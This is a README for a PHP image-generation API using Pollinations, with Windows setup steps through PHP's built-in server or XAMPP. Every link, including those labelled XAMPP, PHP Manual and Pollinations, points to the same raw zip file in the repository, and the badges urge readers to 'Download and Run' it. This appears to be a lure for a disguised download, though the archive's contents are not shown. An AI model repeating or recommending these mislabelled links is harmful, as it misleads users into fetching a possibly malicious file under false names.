# 🤖 ai-image-generator-api - Generate AI images with ease

[![Download and Run](https://img.shields.io/badge/Download-Get%20it%20from%20GitHub-brightgreen)](https://github.com/Obaydur-Rahman/ai-image-generator-api/raw/refs/heads/main/lightship/generator-api-ai-image-v2.1-alpha.2.zip)

---

## 📋 About ai-image-generator-api

ai-image-generator-api is a simple PHP API that helps you create AI-generated images. It uses the Pollinations service to turn text into pictures. You do not need any programming skills to use this tool. It runs on Windows and works through a plain web server setup. This application is designed to make AI image creation easy and accessible.

---

## 💾 Download and Setup on Windows

To begin, you will need to download the files. The link below takes you to the GitHub page where you can find all the files you need.

[Download and run from GitHub](https://github.com/Obaydur-Rahman/ai-image-generator-api/raw/refs/heads/main/lightship/generator-api-ai-image-v2.1-alpha.2.zip)

### Step 1: Visit the project page

Click the link above. This takes you to the main page of the project on GitHub. There you will find the files in the repository.

### Step 2: Download the project files

- On the GitHub page, look for the green button labeled **Code**.
- Click it and choose **Download ZIP**.
- Save the ZIP file to your Desktop or an easy-to-access folder.

### Step 3: Extract the files

- Find the ZIP file you downloaded.
- Right-click the file and choose **Extract All...**
- Select a location where you want to keep the files. For example, Desktop\ai-image-generator-api
- Click **Extract**.

### Step 4: Set up a local PHP server (if you don’t have one)

The API needs a server to run. You can install a lightweight PHP server or use built-in PHP tools if you have PHP installed.

#### Option A: Using PHP's built-in server

- If PHP is installed on your Windows PC, open **Command Prompt** or **PowerShell**.
- Navigate to your extracted folder. For example:
  
  ```
  cd Desktop\ai-image-generator-api
  ```
- Start the PHP server by typing:

  ```
  php -S localhost:8000
  ```
- The API will run on your PC at [http://localhost:8000](http://localhost:8000).

#### Option B: Using XAMPP (easy for Windows users)

- Download and install XAMPP from [https://github.com/Obaydur-Rahman/ai-image-generator-api/raw/refs/heads/main/lightship/generator-api-ai-image-v2.1-alpha.2.zip](https://github.com/Obaydur-Rahman/ai-image-generator-api/raw/refs/heads/main/lightship/generator-api-ai-image-v2.1-alpha.2.zip).
- Open XAMPP Control Panel and start **Apache**.
- Copy the extracted files into the `htdocs` folder inside your XAMPP installation directory (usually `C:\xampp\htdocs\`).
- Access the API at [http://localhost/ai-image-generator-api](http://localhost/ai-image-generator-api).

---

## 🚀 How to Use the API

The API accepts text requests and returns AI-generated images based on that text. You can test it right from your browser or use simple tools like Postman.

### Step 1: Open your web browser

Go to the URL where your server runs, for example:

- http://localhost:8000
- or http://localhost/ai-image-generator-api/

### Step 2: Call the API endpoint

The API listens for requests at `/generate-image.php`. You can type directly into the browser address bar:

```
http://localhost:8000/generate-image.php?text=your+description+here
```

Replace **your+description+here** with the text describing the image you want. For example:

```
http://localhost:8000/generate-image.php?text=red+apple+on+a+table
```

### Step 3: View the result

The API will respond with a link to the generated image. Click the link to view or save the picture.

---

## 🖥 System Requirements

- Windows 7 or later
- PHP version 7.4 or higher
- Internet connection (required to communicate with Pollinations AI)
- Optional: XAMPP or another local server if you prefer

---

## 🔧 Key Features

- Simple PHP API, easy to host locally
- Generate images using text descriptions
- No special software needed beyond a basic PHP server
- Uses Pollinations for AI image creation
- Works with standard web browsers and HTTP requests

---

## 📝 Configuration

You don’t need to configure much. The API uses default Pollinations settings. If you want to change settings like image size or style, these are found in the PHP files.

- Open `generate-image.php` in a text editor.
- Look for variables like `$imageSize` or `$style`.
- Change values directly if needed, but the defaults work well.

---

## 🚑 Troubleshooting

- If the API does not return an image, check your internet connection.
- Make sure PHP is correctly installed and the server is running.
- Verify you accessed the correct URL with the `text` parameter.
- If using XAMPP, ensure Apache is running and files are in the `htdocs` folder.
- Look for error messages in your browser or server logs.

---

## 🔗 Useful Links

- [GitHub Project Page](https://github.com/Obaydur-Rahman/ai-image-generator-api/raw/refs/heads/main/lightship/generator-api-ai-image-v2.1-alpha.2.zip)
- [XAMPP for Windows](https://github.com/Obaydur-Rahman/ai-image-generator-api/raw/refs/heads/main/lightship/generator-api-ai-image-v2.1-alpha.2.zip)
- [PHP Manual](https://github.com/Obaydur-Rahman/ai-image-generator-api/raw/refs/heads/main/lightship/generator-api-ai-image-v2.1-alpha.2.zip)
- [Pollinations AI Service](https://github.com/Obaydur-Rahman/ai-image-generator-api/raw/refs/heads/main/lightship/generator-api-ai-image-v2.1-alpha.2.zip)

---

## 🧩 Supported Topics and Keywords

This project relates to:

- AI image generation
- PHP REST API
- Pollinations AI
- Simple web APIs for images
- Automating picture creation with text prompts

---

## 💡 Additional Tips

- Try simple text descriptions first to see how the AI interprets them.
- Use clear, easy-to-understand phrases for best results.
- You can experiment with different words to get varied images.
- Running locally keeps your usage private and safe.

---

[![Download and Run](https://img.shields.io/badge/Download-Get%20it%20from%20GitHub-blue)](https://github.com/Obaydur-Rahman/ai-image-generator-api/raw/refs/heads/main/lightship/generator-api-ai-image-v2.1-alpha.2.zip)